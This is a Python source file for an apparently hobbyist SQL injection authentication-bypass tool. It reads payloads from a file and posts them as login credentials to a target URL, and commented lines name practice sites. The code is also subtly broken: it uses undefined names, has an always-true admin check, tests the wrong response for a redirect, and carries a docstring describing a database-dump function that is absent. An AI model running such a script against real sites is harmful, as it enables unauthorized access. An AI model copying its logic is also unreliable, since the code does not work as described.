import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
import sqlite3
import os
import sys

lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'scripts'))
sys.path.append(lib_path)
import sys
import os

from headers import *



from headers import *

import logging

current_directory = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))

sys.path.append(project_root)

from logger.logs import logger

############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

"""
Function: mysql_database_dump
Description: Performs a MySQL database dump on a target website.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The 'mysqldump' command-line utility is used for dumping MySQL databases.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage:
1. Import the necessary libraries and dependencies.
2. Use the 'mysql_database_dump(urls, db_name)' function to perform a MySQL database dump on the specified URLs.

Example:
```python
from sql_injection_exploit import mysql_database_dump

urls_to_dump = ["http://example.com/admin", "http://testsite.net/dashboard"]
database_name = "target_db"

for url in urls_to_dump:
    asyncio.run(mysql_database_dump(url, database_name))
"""





####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################
#* Setting a couple of user agents
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

###############################################


#
logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)


async def DUMP_USERNAME_IN_DATABASE(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "DBAusername.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            # assert req.status_code == 200
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                logger.info(f"The website:{urls} is returning {req.status_code} status")
                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 
                        params = { 
                            "username": line,
                            "password": line
                        }
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header})
                            logger.info(f"Testing the payload:{line} on the target:{urls}") 
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info("Could find ERROR parameter, keyword:{line}")
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info(f"Could find vulnerability id parameter, keyword:{line}")
                                await asyncio.sleep(3) 
                            
                            if htmlVULN:
                                logger.info(f"Could find vulnerability error parameter, keyword:{line}")
                                await asyncio.sleep(3)
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info(f"Could find parameter id, keyword:{line}")
                                await asyncio.sleep(3)
                            
                            if errword:
                                logger.info(f"Could find parameter error, keyword:{line}")
                                await asyncio.sleep(3)
                                
                            
                                
                        if req.status_code == 302:                                             
                            logger.info(f"Could break into the target:{urls},keyword:{line}")
                            done = True
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                           logger.info("Could find admin parameter, keyword:{line}")
                            
                else:
                   logger.info(f"Host {urls} is down.")
        # await create_database_for_Captures()
        #############################################################################################################
    except Exception as e:
        logger.info(f"Error: {e}")
        
    except KeyboardInterrupt:
        pass

    except SystemExit as syse:
        raise syse
        
    finally:
        pass
     
        
        
     

async def auth_main(urL):
    await auth_SQL_inj(urL)

# asyncio.run(conditional_SQL_inj("http://testfire.net/login.jsp"))
# asyncio.run(DUMP_USERNAME_IN_DATABASE("http://testfire.net/login.jsp"))
